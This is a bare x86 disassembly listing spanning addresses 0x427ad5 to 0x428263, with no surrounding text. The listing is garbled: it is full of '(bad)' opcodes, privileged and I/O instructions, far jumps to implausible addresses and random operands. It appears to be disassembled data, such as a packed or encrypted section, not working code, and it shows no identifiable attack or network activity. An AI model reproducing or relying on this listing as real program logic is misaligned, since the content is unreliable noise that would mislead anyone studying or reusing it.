  427ad5:	clc    
  427ad6:	retf   
  427ad7:	inc    ebp
  427ad8:	into   
  427ad9:	cmp    al,0xc6
  427adb:	pushf  
  427adc:	scas   eax,DWORD PTR es:[edi]
  427add:	(bad)  
  427ade:	mov    ebp,DWORD PTR [esp+esi*8+0x2bf85585]
  427ae5:	inc    ebp
  427ae6:	cmp    edi,DWORD PTR [esi]
  427ae8:	ja     0x427a86
  427aea:	mov    eax,edi
  427aec:	mov    esp,0x458567a8
  427af1:	clc    
  427af2:	mov    eax,DWORD PTR [ebp-0x8]
  427af5:	mov    eax,ebx
  427af7:	in     al,dx
  427af8:	retf   
  427af9:	ret    
  427afa:	into   
  427afb:	mov    dh,0x7d
  427afe:	scas   eax,DWORD PTR es:[edi]
  427aff:	cmp    ecx,DWORD PTR [ebx+0x5518f40f]
  427b05:	add    BYTE PTR [ebx],ch
  427b07:	jmp    0xb97c47
  427b0c:	mov    eax,DWORD PTR [ebp-0x5c]
  427b0f:	mov    eax,DWORD PTR [ebp-0x14]
  427b12:	inc    ebp
  427b13:	enter  0x458b,0xf8
  427b17:	xor    eax,ebx
  427b19:	add    ecx,ebx
  427b1b:	cmp    ecx,esi
  427b1d:	shufps xmm7,xmm4,0xaf
  427b21:	add    BYTE PTR [ebx+0x55e8f48b],cl
  427b27:	dec    ebp
  427b28:	sub    esi,DWORD PTR [ebx]
  427b2a:	cmp    esi,DWORD PTR [ebx]
  427b2c:	ja     0x427b31
  427b2e:	mov    eax,DWORD PTR [ebx]
  427b30:	lods   al,BYTE PTR ds:[esi]
  427b31:	mov    db0,ecx
  427b34:	inc    ebp
  427b35:	dec    ebp
  427b36:	mov    ecx,DWORD PTR [ebx-0x2e3c1308]
  427b3c:	retf   
  427b3d:	rol    dh,1
  427b3f:	or     al,0xce
  427b41:	inc    ebp
  427b42:	scas   eax,DWORD PTR es:[edi]
  427b43:	xor    ecx,DWORD PTR [ebx+0x55e9f403]
  427b49:	add    BYTE PTR [ebx],ch
  427b4b:	add    BYTE PTR [ebx],bh
  427b4d:	inc    ebp
  427b4e:	mov    ecx,DWORD PTR [ebx-0x3cfc074c]
  427b54:	inc    ebp
  427b55:	retf   
  427b56:	mov    ecx,esi
  427b58:	clc    
  427b59:	(bad)  
  427b5a:	retf   
  427b5b:	scas   eax,DWORD PTR es:[edi]
  427b5c:	ret    
  427b5d:	mov    ecx,esi
  427b5f:	hlt    
  427b60:	(bad)  
  427b61:	push   ebp
  427b62:	scas   eax,DWORD PTR es:[edi]
  427b63:	sub    ecx,DWORD PTR [ecx+0x4577083b]
  427b69:	mov    ecx,DWORD PTR [ecx+0x4589e4e8]
  427b6f:	add    BYTE PTR [ebx],al
  427b71:	mov    eax,eax
  427b73:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427b74:	inc    ebp
  427b75:	dec    ebp
  427b76:	cmp    BYTE PTR [ebx],dh
  427b78:	pushf  
  427b79:	xor    ecx,DWORD PTR [ecx+0x4503d003]
  427b7f:	(bad)  
  427b81:	rcr    DWORD PTR [ebp+ecx*2-0x134f7439],0x85
  427b89:	sar    eax,1
  427b8b:	rol    BYTE PTR [ebp+0x5],1
  427b8e:	xor    eax,DWORD PTR [ebp+0x3]
  427b91:	jmp    0x427b7e
  427b93:	mov    ecx,DWORD PTR [ebx-0x3cb22754]
  427b99:	xor    eax,DWORD PTR [ebp+0x33]
  427b9c:	mov    eax,DWORD PTR [ebx]
  427b9e:	rol    BYTE PTR [ebx],1
  427ba0:	test   BYTE PTR [edi],cl
  427ba2:	cwde   
  427ba3:	shl    DWORD PTR [edx],0x4d
  427ba6:	mov    BYTE PTR [ebx-0x2eba13f5],cl
  427bac:	xor    edx,eax
  427bae:	add    eax,DWORD PTR ds:0xeb4d45e0
  427bb4:	mov    cl,BYTE PTR [ebx+0x4d72b408]
  427bba:	add    BYTE PTR [ebx],dh
  427bbc:	inc    ebp
  427bbd:	xor    ecx,DWORD PTR [edx+0x4d030b03]
  427bc3:	rdpmc  
  427bc5:	rol    DWORD PTR [ebx],0x4d
  427bc8:	loopne 0x427b55
  427bca:	push   ebp
  427bcb:	in     al,dx
  427bcc:	mov    cl,dl
  427bce:	adc    eax,edx
  427bd0:	jb     0x427bd7
  427bd2:	add    BYTE PTR [ebp+0x45],al
  427bd5:	jmp    0x427b62
  427bd7:	mov    ebx,eax
  427bd9:	test   al,0xcb
  427bdb:	dec    ebp
  427bdc:	dec    ebp
  427bdd:	xor    ecx,DWORD PTR [ebx-0x7bfc2fcd]
  427be3:	add    ebx,DWORD PTR [eax-0x743ecdf1]
  427be9:	dec    ebp
  427bea:	mov    al,0x8b
  427bec:	dec    ebp
  427bed:	in     al,dx
  427bee:	xor    edx,ecx
  427bf0:	xor    edx,eax
  427bf2:	add    eax,DWORD PTR [ebp+0x3]
  427bf5:	jbe    0x427c06
  427bf7:	mov    eax,ecx
  427bf9:	test   al,0x45
  427bfb:	dec    ebp
  427bfc:	mov    DWORD PTR [ebx],esi
  427bfe:	loopne 0x427c33
  427c00:	inc    ebp
  427c01:	add    ecx,DWORD PTR [ebx-0x3cf01bfd]
  427c07:	rol    esi,0x45
  427c0a:	scas   eax,DWORD PTR es:[edi]
  427c0b:	mov    ecx,DWORD PTR [ebx-0x34ba0ff8]
  427c11:	mov    eax,ecx
  427c13:	hlt    
  427c14:	dec    ebp
  427c15:	inc    ebp
  427c16:	mov    eax,edi
  427c18:	loopne 0x427bf2
  427c1a:	retf   
  427c1b:	test   esi,ecx
  427c1d:	clc    
  427c1e:	scas   eax,DWORD PTR es:[edi]
  427c1f:	inc    ebp
  427c20:	mov    eax,edi
  427c22:	fdiv   st,st(0)
  427c24:	rol    DWORD PTR [ebp+0x458cf8c6],cl
  427c2a:	cwde   
  427c2b:	cmp    dh,BYTE PTR [edx]
  427c2d:	pushf  
  427c2e:	cmp    ecx,DWORD PTR [ebx-0x3ca127f1]
  427c34:	inc    esi
  427c36:	mov    ebp,DWORD PTR [eax-0x10]
  427c39:	inc    ebp
  427c3a:	dec    ebp
  427c3b:	xor    esi,DWORD PTR [ebx]
  427c3d:	add    eax,DWORD PTR [ebx]
  427c3f:	loopne 0x427c50
  427c41:	dec    ebp
  427c42:	ror    DWORD PTR [edx+0x7233084d],0x3
  427c49:	add    BYTE PTR [ebx-0x7b740bbb],cl
  427c4f:	lock cwde 
  427c51:	ret    
  427c52:	xor    al,BYTE PTR [ebp-0x77]
  427c55:	mov    esi,esp
  427c57:	rol    BYTE PTR [ebp-0x7c],1
  427c5a:	xor    ebx,DWORD PTR [eax-0x7772cd47]
  427c60:	call   edi
  427c62:	enter  0x4d45,0x8b
  427c66:	mov    esi,eax
  427c68:	fmul   st(3),st
  427c6a:	push   ebp
  427c6b:	dec    ebp
  427c6c:	xor    ecx,DWORD PTR [ebx-0x7bf02ffd]
  427c72:	ret    0xc198
  427c75:	xor    al,BYTE PTR [esi-0x280276]
  427c7b:	dec    ebp
  427c7c:	jne    0x427cb1
  427c7e:	mov    eax,DWORD PTR [ebx]
  427c80:	cld    
  427c81:	loopne 0x427c33
  427c83:	push   ebp
  427c84:	add    DWORD PTR [eax+0x72851100],ecx
  427c8a:	inc    DWORD PTR [eax]
  427c8c:	inc    DWORD PTR [ebp-0x75]
  427c8f:	mov    edi,esp
  427c91:	lock add bl,0x1
  427c95:	retf   
  427c96:	add    dh,al
  427c98:	xor    dh,cl
  427c9a:	inc    ebp
  427c9b:	scas   eax,DWORD PTR es:[edi]
  427c9c:	mov    eax,DWORD PTR [ebx]
  427c9e:	shl    al,0x0
  427ca1:	inc    ebp
  427ca2:	dec    DWORD PTR [ebx+0x4dccf0ff]
  427ca8:	call   0x458ee0
  427cad:	ud0    eax,ecx
  427cb0:	adc    al,0x4d
  427cb2:	inc    ebp
  427cb3:	xor    ecx,DWORD PTR [ebx+0x8bd82b]
  427cb9:	lock push 0x338055
  427cbf:	add    eax,DWORD PTR [eax]
  427cc1:	ud0    ecx,edx
  427cc4:	sbb    BYTE PTR [ebp+0x5e],dl
  427cc7:	xor    ecx,ecx
  427cc9:	sub    eax,DWORD PTR [ecx*4+0x72ec1155]
  427cd0:	push   ecx
  427cd1:	add    BYTE PTR [ebp-0x38],cl
  427cd4:	mov    DWORD PTR [esi-0x740004],eax
  427cda:	cld    
  427cdb:	inc    ebp
  427cdc:	xchg   edx,eax
  427cdd:	mov    ecx,DWORD PTR [ebx-0x743c761c]
  427ce3:	xabort 0xaf
  427ce6:	icebp  
  427ce7:	mov    esi,DWORD PTR [ebp-0x28]
  427cea:	(bad)  
  427ceb:	retf   
  427cec:	or     ecx,eax
  427cee:	(bad)  
  427cef:	dec    ebp
  427cf0:	pop    es
  427cf1:	(bad)  
  427cf2:	(bad)  
  427cf3:	or     BYTE PTR [esi],al
  427cf5:	jb     0x427cbd
  427cf7:	add    BYTE PTR [ebx],al
  427cf9:	inc    ebp
  427cfa:	(bad)  
  427cfb:	mov    ecx,DWORD PTR [edx]
  427cfd:	fadd   st(6),st
  427cff:	ret    
  427d00:	add    ch,BYTE PTR [eax-0x37]
  427d03:	int    0x55
  427d05:	sub    ebp,esp
  427d07:	add    edx,DWORD PTR [ecx-0x14]
  427d0a:	inc    ebp
  427d0b:	inc    ebp
  427d0c:	mov    DWORD PTR [ebx-0x3c740b04],ecx
  427d12:	cld    
  427d13:	(bad)  
  427d14:	mov    gs,WORD PTR [edi+0xf893be0]
  427d1a:	mov    ebp,ebp
  427d1c:	clc    
  427d1d:	push   eax
  427d1f:	push   DWORD PTR [ebp-0x4]
  427d22:	mov    BYTE PTR [ebp+0xa],0xff
  427d26:	(bad)  
  427d27:	int3   
  427d28:	or     BYTE PTR [eax],al
  427d2a:	(bad)  
  427d2b:	lea    eax,[edi]
  427d2d:	ins    BYTE PTR es:[edi],dx
  427d2e:	(bad)  
  427d2f:	inc    DWORD PTR [ecx]
  427d31:	push   eax
  427d32:	mov    BYTE PTR [ebp+0x9],0x8b
  427d36:	leave  
  427d37:	les    edx,FWORD PTR [ebp+0x0]
  427d3a:	in     al,dx
  427d3b:	call   DWORD PTR [ecx-0x75]
  427d3e:	inc    ebp
  427d3f:	cld    
  427d40:	mov    DWORD PTR [eax+0x8b01fc],eax
  427d46:	cld    
  427d47:	xor    BYTE PTR [edi-0x76a8f98b],bh
  427d4d:	std    
  427d4e:	mov    eax,DWORD PTR [eax]
  427d50:	clc    
  427d51:	test   eax,esi
  427d53:	je     0x427dca
  427d55:	mov    eax,esi
  427d57:	cld    
  427d58:	add    al,0x80
  427d5a:	add    WORD PTR [ecx+0x0],ax
  427d5e:	fadd   QWORD PTR [eax]
  427d60:	mov    BYTE PTR [eax],0xd0
  427d63:	push   0xffffffc3
  427d65:	push   edi
  427d66:	mov    edx,DWORD PTR [eax+0x51]
  427d69:	pop    edi
  427d6a:	lea    ebx,[ebx-0x8]
  427d6d:	ret    0x45
  427d70:	mov    ecx,DWORD PTR [ebx-0x7241ae04]
  427d76:	xchg   eax,edi
  427d78:	mov    DWORD PTR [ebp-0x75],ecx
  427d7b:	push   esi
  427d7c:	clc    
  427d7d:	jne    0x427d4f
  427d7f:	mov    ecx,0xf8450b0b
  427d84:	(bad)  
  427d85:	push   cs
  427d86:	or     BYTE PTR [ebp-0x3a],dh
  427d89:	cmp    eax,DWORD PTR [ecx]
  427d8b:	pop    esi
  427d8c:	(bad)  
  427d8d:	or     al,0x5
  427d8f:	inc    eax
  427d90:	leave  
  427d91:	in     al,dx
  427d92:	add    al,0x42
  427d94:	push   esi
  427d95:	and    eax,0xedc940cf
  427d9a:	inc    DWORD PTR [eax-0x75]
  427d9d:	fmul   QWORD PTR [ebx-0xf8739be]
  427da3:	inc    eax
  427da4:	nop
  427da5:	jmp    0x518b:0x8b8bc3ff
  427dac:	(bad)  
  427dad:	lea    eax,ds:0xff45e8f8
  427db3:	push   esi
  427db4:	push   DWORD PTR [ebp-0x39]
  427db7:	mov    eax,0x7edda46
  427dbc:	or     al,0x6
  427dbe:	push   DWORD PTR [ebp-0x3a]
  427dc1:	cmp    eax,DWORD PTR [edx]
  427dc3:	pop    esi
  427dc4:	ret    
  427dc5:	or     al,0x56
  427dc7:	inc    ecx
  427dc8:	push   ebp
  427dc9:	js     0x427db7
  427dcb:	inc    edx
  427dcc:	inc    ebp
  427dcd:	int    0x1
  427dcf:	inc    ecx
  427dd0:	sub    BYTE PTR ds:0xe77541fc,ah
  427dd6:	add    DWORD PTR [edx+0x1c],eax
  427dd9:	int3   
  427dda:	mov    eax,ebx
  427ddc:	adc    al,0x8b
  427dde:	xchg   edx,eax
  427ddf:	push   ecx
  427de0:	mov    cl,BYTE PTR [ebp+0x45c8f8fe]
  427de6:	rcl    DWORD PTR [esi-0x9],cl
  427de9:	jne    0x427e3b
  427deb:	mov    eax,0x7c80ece
  427df0:	rol    DWORD PTR [esi],cl
  427df2:	div    DWORD PTR [ebp+0x50]
  427df5:	cmp    ecx,edx
  427df7:	pop    esi
  427df8:	dec    BYTE PTR [edx]
  427dfa:	in     al,dx
  427dfb:	inc    edx
  427dfc:	sub    ebp,ecx
  427dfe:	inc    eax
  427dff:	(bad)  
  427e00:	push   eax
  427e01:	add    edx,DWORD PTR [eax-0x17]
  427e04:	push   edi
  427e05:	add    dh,dh
  427e07:	leave  
  427e08:	adc    DWORD PTR [ebp-0x1],0xffffffec
  427e0c:	add    BYTE PTR [ecx+0x0],dl
  427e0f:	inc    ebp
  427e10:	ror    DWORD PTR [ecx+0x5536fc8d],cl
  427e16:	add    BYTE PTR [eax-0x7fbf448],bh
  427e1c:	add    al,0x2
  427e1e:	jmp    0x57e2978
  427e23:	jne    0x427e0d
  427e25:	mov    eax,DWORD PTR [edx]
  427e27:	or     BYTE PTR [eax],al
  427e29:	inc    ecx
  427e2a:	stc    
  427e2b:	in     eax,dx
  427e2c:	ss inc eax
  427e2e:	aas    
  427e2f:	out    0x7d,eax
  427e31:	inc    ecx
  427e32:	mov    esi,ecx
  427e34:	lock ret 0x7d
  427e38:	and    ecx,DWORD PTR [ebx-0x171777]
  427e3e:	add    bh,bh
  427e40:	aad    0xd7
  427e42:	add    dh,cl
  427e44:	clts   
  427e46:	(bad)  
  427e47:	call   0xffcd7d4c
  427e4c:	hlt    
  427e4d:	iret   
  427e4e:	jge    0x427e26
  427e50:	rol    DWORD PTR [esi-0x80],cl
  427e53:	icebp  
  427e54:	or     BYTE PTR [edi-0x27],cl
  427e57:	(bad)  
  427e58:	out    dx,al
  427e59:	mov    eax,DWORD PTR [ebx]
  427e5b:	(bad)  
  427e5c:	pop    esi
  427e5d:	push   es
  427e5e:	cmp    al,0xe8
  427e60:	sar    edi,0x8
  427e63:	inc    DWORD PTR [edi]
  427e65:	inc    esi
  427e66:	(bad)  
  427e67:	jmp    0x8b00:0x530e577e
  427e6e:	push   esi
  427e6f:	mov    eax,DWORD PTR [eax]
  427e71:	and    al,0x0
  427e73:	inc    ebp
  427e74:	push   eax
  427e75:	push   eax
  427e76:	add    DWORD PTR [ebx+0x757d1834],ecx
  427e7c:	sub    edx,DWORD PTR [esi-0x24]
  427e7f:	jne    0x427e37
  427e81:	lods   eax,DWORD PTR ds:[esi]
  427e82:	mov    edx,DWORD PTR [edx-0x34]
  427e85:	dec    esi
  427e86:	out    0x83,eax
  427e88:	into   
  427e89:	push   edi
  427e8b:	loopne 0x427e5b
  427e8d:	shr    BYTE PTR [edx+ecx*4+0x0],1
  427e91:	and    DWORD PTR [edx-0x741fff01],0xffffffd0
  427e98:	rol    DWORD PTR [edx],0x8
  427e9b:	mov    esp,ecx
  427e9d:	cmp    DWORD PTR [ebx],0xc
  427ea0:	mov    esi,0x5001c0
  427ea5:	push   eax
  427ea6:	push   cs
  427ea7:	push   eax
  427ea8:	(bad)  
  427ea9:	sub    edx,edi
  427eab:	push   esi
  427eac:	adc    al,0xcb
  427eae:	ins    DWORD PTR es:[edi],dx
  427eaf:	mov    eax,0x203e8
  427eb4:	add    al,ah
  427eb6:	ror    BYTE PTR [eax+0xc007c0],0xc0
  427ebd:	add    dh,al
  427ebf:	add    ah,ch
  427ec1:	rol    DWORD PTR [ebx-0x3595fb0d],1
  427ec7:	pop    ecx
  427ec8:	or     eax,ebx
  427eca:	cli    
  427ecb:	add    BYTE PTR [ecx-0x4e728d1e],dh
  427ed1:	lea    ebp,[ebx]
  427ed3:	mov    edx,DWORD PTR [edx-0x4]
  427ed6:	dec    ecx
  427ed7:	inc    ebp
  427ed8:	shr    BYTE PTR [ebx],0x4b
  427edb:	and    al,0x0
  427edd:	(bad)  
  427ede:	jne    0x427f25
  427ee0:	pop    eax
  427ee1:	mov    al,0x5a
  427ee3:	call   0x1418142
  427ee8:	and    al,0x85
  427eea:	push   edx
  427eeb:	add    BYTE PTR [eax+eax*1+0x0],ah
  427eef:	dec    ebp
  427ef0:	mov    cl,0x23
  427ef2:	jmp    0x427ee0
  427ef4:	mov    al,0xe7
  427ef6:	call   0x13881e4
  427efb:	shr    DWORD PTR [eax+ebx*2],cl
  427efe:	lock (bad) 
  427f00:	adc    eax,0x757f008d
  427f05:	out    0x58,eax
  427f07:	cmp    al,0x7
  427f09:	pop    edx
  427f0a:	or     DWORD PTR [edx+eax*1-0x74fff494],ecx
  427f11:	push   ecx
  427f12:	cld    
  427f13:	mov    esi,0x3b0175
  427f18:	and    al,0xb0
  427f1a:	xor    BYTE PTR [edx+0x1],0x8b
  427f1e:	add    ah,bh
  427f20:	mov    edi,DWORD PTR [ebp-0x4]
  427f23:	psubsw mm7,QWORD PTR [edi]
  427f26:	add    DWORD PTR [ebp+0x0],ebp
  427f29:	rcr    eax,1
  427f2b:	mov    edi,ecx
  427f2d:	and    eax,DWORD PTR [eax]
  427f2f:	add    ecx,DWORD PTR [ebx+0x1b4dd88d]
  427f35:	call   0x12f821e
  427f3a:	add    al,cl
  427f3c:	mov    ebp,esi
  427f3e:	aam    0x83
  427f40:	or     DWORD PTR [ecx],eax
  427f42:	jne    0x427f35
  427f44:	mov    eax,DWORD PTR [eax]
  427f46:	aam    0x0
  427f48:	dec    ebp
  427f49:	jne    0x427ed6
  427f4b:	cmp    ebx,eax
  427f4d:	jb     0x427f9c
  427f4f:	jmp    0x427edc
  427f51:	mov    ebx,esp
  427f53:	int3   
  427f54:	dec    ebp
  427f55:	or     DWORD PTR [ecx+0x5f8bdc00],0xffffff8b
  427f5c:	mov    edx,0x8b0a8b
  427f61:	cmp    ecx,DWORD PTR [eax]
  427f63:	jb     0x427f3c
  427f65:	pop    edx
  427f66:	push   edi
  427f67:	cli    
  427f68:	pop    es
  427f69:	mov    eax,ecx
  427f6b:	jb     0x427f6f
  427f6d:	add    DWORD PTR [ebx],0xa
  427f70:	mov    eax,DWORD PTR [ebx]
  427f72:	int3   
  427f73:	add    bh,BYTE PTR [esi+0x75d10006]
  427f79:	jmp    0x427f06
  427f7b:	mov    al,0xe8
  427f7d:	call   0x10381ff
  427f82:	add    edx,DWORD PTR [ecx+ecx*8]
  427f85:	pop    edi
  427f86:	or     BYTE PTR [ecx-0x73],bl
  427f89:	pop    ecx
  427f8a:	inc    edi
  427f8b:	xor    al,0xeb
  427f8d:	push   ecx
  427f8e:	mov    edi,DWORD PTR [edx+0xc506cc]
  427f94:	call   0xb18099
  427f99:	int3   
  427f9a:	sbb    BYTE PTR [esi],ch
  427f9c:	inc    ebp
  427f9d:	add    BYTE PTR [ebx-0x1f4f338b],cl
  427fa3:	call   0x9b8212
  427fa8:	or     BYTE PTR [ebx-0x73],dl
  427fab:	cmp    al,0x47
  427fad:	mov    al,0x1
  427faf:	jb     0x427fb1
  427fb1:	mov    al,0x10
  427fb3:	push   eax
  427fb4:	add    al,0x75
  427fb6:	add    BYTE PTR [ebx],ch
  427fb8:	add    ebx,esp
  427fba:	int3   
  427fbb:	jne    0x427fcd
  427fbd:	movsx  edx,cl
  427fc0:	add    DWORD PTR [eax],eax
  427fc2:	add    BYTE PTR [ebp+ecx*2+0x40aa2b7d],ch
  427fc9:	mov    gs,edi
  427fcb:	add    BYTE PTR [eax-0x50],ch
  427fce:	add    al,ch
  427fd0:	mov    eax,DWORD PTR [ecx]
  427fd2:	sub    eax,DWORD PTR [eax]
  427fd4:	jb     0x42804b
  427fd6:	add    DWORD PTR [esp+eiz*8-0x50],esi
  427fda:	jge    0x427fc4
  427fdc:	add    al,0x1
  427fde:	add    DWORD PTR [eax],0x0
  427fe1:	jne    0x427fe3
  427fe3:	je     0x42802a
  427fe5:	mov    eax,DWORD PTR [edi]
  427fe7:	ror    BYTE PTR [ebp+0x4d],1
  427fea:	or     DWORD PTR [ecx+0x4d03d004],0x3
  427ff1:	mov    DWORD PTR [ebx-0x1eb2372c],ecx
  427ff7:	mov    DWORD PTR [ebx],ebp
  427ff9:	fadd   DWORD PTR [eax+0x75]
  427ffc:	inc    eax
  427ffd:	pop    eax
  427ffe:	lea    ebx,[ecx+0x4f]
  428001:	push   0xb1000003
  428006:	out    dx,eax
  428007:	add    ebp,DWORD PTR [edx+edx*2]
  42800a:	add    BYTE PTR [ebx+ecx*4],bh
  42800d:	mov    ch,BYTE PTR [ebx]
  42800f:	jb     0x428083
  428011:	add    al,0x89
  428013:	push   eax
  428014:	call   0x842acd86
  428019:	add    DWORD PTR [eax+eax*1],eax
  42801c:	jae    0x428032
  42801e:	icebp  
  42801f:	inc    ebp
  428020:	mov    eax,DWORD PTR gs:[ecx]
  428023:	int3   
  428024:	out    dx,al
  428025:	loopne 0x428074
  428027:	sub    eax,DWORD PTR [edx]
  428029:	push   0xffffff83
  42802b:	pop    esi
  42802c:	push   cs
  42802d:	jl     0x428048
  42802f:	add    al,0xaf
  428031:	xor    eax,0x832b6d00
  428036:	mov    eax,DWORD PTR [edx]
  428038:	rcr    BYTE PTR [ebp+0x754500dc],cl
  42803e:	ror    DWORD PTR [ebx+0x7dc8e803],1
  428044:	inc    ebp
  428045:	shr    ebx,0x3
  428048:	or     DWORD PTR [eax],0x4
  42804b:	push   0xffffffa5
  42804d:	pop    esi
  42804e:	add    BYTE PTR [ecx+edx*8-0x23ff2efc],bh
  428055:	jmp    0x4280b4
  428057:	mov    edi,0xff0272
  42805c:	fdivr  QWORD PTR [ebp+0x5d]
  42805f:	push   0x4e
  428061:	pop    ecx
  428062:	call   0x42c467
  428067:	mov    DWORD PTR [ebx],eax
  428069:	in     al,0xc8
  42806b:	rol    BYTE PTR [ebp-0x75],0xc1
  42806f:	call   0xac8250
  428074:	pop    esi
  428075:	enter  0xceff,0x8b
  428079:	repz mov ecx,DWORD PTR [ebp-0x34]
  42807d:	xor    DWORD PTR [esi-0x57f0ff3c],0xffffffb0
  428084:	je     0x428086
  428086:	or     DWORD PTR [ebx-0x74183b24],eax
  42808c:	jne    0x428072
  42808e:	jmp    0x428089
  428090:	push   DWORD PTR [edx-0x24]
  428093:	push   0x4d
  428095:	pop    ecx
  428096:	cmp    DWORD PTR [ebp+0x2],0xffffffc1
  42809a:	jge    0x4280a2
  42809c:	mov    eax,eax
  42809e:	sub    ebp,DWORD PTR [edx+0x24]
  4280a1:	pop    esi
  4280a2:	inc    ebp
  4280a3:	mov    esp,0x8b6077
  4280a8:	sub    ecx,DWORD PTR [ebx+0x155e8dc]
  4280ae:	lods   al,BYTE PTR ds:[esi]
  4280af:	add    BYTE PTR [ebx],bh
  4280b1:	enter  0xce73,0x49
  4280b5:	repz test DWORD PTR [ebp+0x7d],0xf0dc0f89
  4280bd:	stc    
  4280be:	jge    0x428132
  4280c0:	jnp    0xdd42042f
  4280c6:	call   0xc5819c
  4280cb:	fadd   st(0),st
  4280cd:	dec    esi
  4280ce:	ins    BYTE PTR es:[edi],dx
  4280cf:	stc    
  4280d0:	cmp    al,0x73
  4280d2:	push   ebp
  4280d3:	mov    eax,0xf8028b
  4280d8:	jne    0x42809b
  4280da:	mov    esi,ecx
  4280dc:	mov    esp,DWORD PTR [ebp+0x2c]
  4280df:	add    edi,DWORD PTR [ebp-0x24]
  4280e2:	sub    esp,eax
  4280e4:	and    al,0x45
  4280e6:	cmp    cl,BYTE PTR [ecx+0x2d5fcc5b]
  4280ec:	sbb    al,0xee
  4280ee:	pop    esi
  4280ef:	call   0x82811f
  4280f4:	fsubr  st,st(3)
  4280f6:	sti    
  4280f7:	add    BYTE PTR gs:[ecx],bh
  4280fa:	add    eax,esp
  4280fc:	add    DWORD PTR [esi],eax
  4280fe:	rol    DWORD PTR [ebp+0x8],0x29
  428102:	mov    esp,eax
  428104:	clc    
  428105:	jne    0x42817c
  428107:	mov    eax,0x8b0673
  42810c:	loopne 0x428153
  42810e:	loopne 0x428099
  428110:	lods   al,BYTE PTR ds:[esi]
  428111:	int3   
  428112:	inc    ebp
  428113:	mov    DWORD PTR gs:[eax+edi*8],eax
  428117:	add    al,0xc3
  428119:	sub    ecx,DWORD PTR [ebp+0x47]
  42811c:	(bad)  
  42811e:	shr    BYTE PTR [ebp-0x1f],0xe8
  428122:	add    eax,DWORD PTR [eax]
  428124:	call   0x6444229
  428129:	add    esi,DWORD PTR [esi-0x3b2efc83]
  42812f:	dec    esi
  428130:	ins    DWORD PTR es:[edi],dx
  428131:	in     al,dx
  428132:	lea    eax,[eax]
  428134:	inc    ebp
  428135:	inc    ebp
  428136:	sub    ecx,DWORD PTR [ebx-0x3eba1b73]
  42813c:	or     DWORD PTR [ebx-0x38ff0400],0x398b4573
  428146:	and    al,0xdc
  428148:	ror    DWORD PTR [edx+0x24],0xf7
  42814c:	or     BYTE PTR [ebp+0x4c],dh
  42814f:	mov    ebx,DWORD PTR [eax+ebp*1-0x64]
  428153:	stos   BYTE PTR es:[edi],al
  428154:	adc    edx,edi
  428156:	inc    esp
  428157:	add    edi,DWORD PTR [eax]
  428159:	jne    0x42813e
  42815b:	mov    DWORD PTR [eax-0x7449db04],ecx
  428161:	cmp    ecx,DWORD PTR [edi]
  428163:	sub    BYTE PTR [ebp-0x7e],dl
  428166:	sar    ebp,0xb
  428169:	jmp    FWORD PTR [edi+0x2400392a]
  42816f:	sub    esi,DWORD PTR [ebx-0x73]
  428172:	mov    esp,DWORD PTR [ecx+edi*4]
  428175:	mov    ecx,DWORD PTR [eax]
  428177:	and    BYTE PTR [eax],al
  428179:	jne    0x428145
  42817b:	sub    ebp,ecx
  42817d:	sbb    BYTE PTR [esi+0x32],ah
  428180:	dec    ebp
  428181:	push   ebp
  428182:	add    ecx,DWORD PTR [ebx+0x7d24fc8d]
  428188:	ret    
  428189:	mov    edx,ebp
  42818b:	leave  
  42818c:	sub    DWORD PTR [esi+0x24],ebx
  42818f:	ret    0x2b
  428192:	pop    ax
  428194:	push   ebp
  428195:	rol    BYTE PTR [ebx],0xeb
  428198:	add    DWORD PTR [ecx+0x6c0001],0x40
  42819f:	jb     0x4281f6
  4281a1:	ret    
  4281a2:	in     al,dx
  4281a3:	jecxz  0x428130
  4281a5:	push   esi
  4281a6:	xchg   esp,eax
  4281a7:	jne    0x4281a9
  4281a9:	cmp    edx,DWORD PTR [esi+0x1c]
  4281ac:	jne    0x428192
  4281ae:	mov    eax,DWORD PTR [ebp-0x77]
  4281b1:	ror    DWORD PTR [ebx+0x899408],0xe0
  4281b8:	mov    esi,DWORD PTR [ebp-0x75]
  4281bb:	pop    esi
  4281bc:	nop
  4281bd:	mov    eax,DWORD PTR [eax]
  4281bf:	les    ecx,FWORD PTR [ecx-0x6b3e744a]
  4281c5:	add    al,0x0
  4281c7:	inc    ebp
  4281c8:	mov    eax,DWORD PTR [ebx]
  4281ca:	mov    ebp,ebx
  4281cc:	cmp    al,0xf
  4281ce:	or     al,al
  4281d0:	inc    ebp
  4281d1:	inc    ebp
  4281d2:	cmp    BYTE PTR [ebx+0x6c8bc89c],cl
  4281d8:	cld    
  4281d9:	add    BYTE PTR [edi+0x506c16c0],dh
  4281df:	add    BYTE PTR [ecx-0x5],dl
  4281e2:	add    eax,0x17200
  4281e7:	sbb    al,0x85
  4281e9:	dec    esp
  4281ea:	je     0x428224
  4281ec:	mov    esp,DWORD PTR [eax+ecx*8+0x20]
  4281f0:	add    BYTE PTR [ebx],bh
  4281f2:	(bad)  
  4281f3:	and    al,0x39
  4281f5:	jae    0x428193
  4281f7:	mov    cl,cl
  4281f9:	inc    DWORD PTR [esp]
  4281fc:	push   ebp
  4281fd:	shr    esp,0x8
  428200:	in     al,dx
  428201:	push   esp
  428202:	add    DWORD PTR [eax],esp
  428204:	add    bl,cl
  428206:	inc    ebp
  428207:	mov    bh,0x89
  428209:	add    ah,bh
  42820b:	jmp    0xca7b9155
  428210:	pushf  
  428211:	dec    esp
  428212:	mov    edx,0xf8178520
  428217:	fst    DWORD PTR [ebp+0x0]
  42821a:	mov    BYTE PTR [eax],0xc4
  42821d:	sub    edx,DWORD PTR [ebx-0x3f]
  428220:	inc    ebp
  428221:	add    eax,0xc601dc
  428226:	mov    al,0xc6
  428229:	ins    BYTE PTR es:[edi],dx
  42822a:	mov    DWORD PTR [eax+0x57],0x2e0545c1
  428231:	dec    esp
  428232:	jmp    DWORD PTR [eax]
  428234:	inc    ebp
  428235:	fnstcw WORD PTR [eax+0x29]
  428238:	test   BYTE PTR [eax],0xc5
  42823b:	rol    BYTE PTR [eax],0xc0
  42823e:	lea    ecx,[ebp-0x3cf0dbcb]
  428244:	sbb    BYTE PTR [ebx-0x75fcae0d],cl
  42824a:	inc    esi
  42824b:	add    DWORD PTR [eax],ebx
  42824d:	add    dh,bh
  42824f:	mov    esi,DWORD PTR [edx+0x8]
  428252:	(bad)  
  428253:	fdiv   QWORD PTR ss:[ecx]
  428256:	(bad)  
  428257:	mov    bl,ch
  428259:	add    esi,eax
  42825b:	add    dh,bl
  42825d:	or     esi,eax
  42825f:	mov    dl,0xdf
  428261:	add    esi,eax
  428263:	add    al,ah
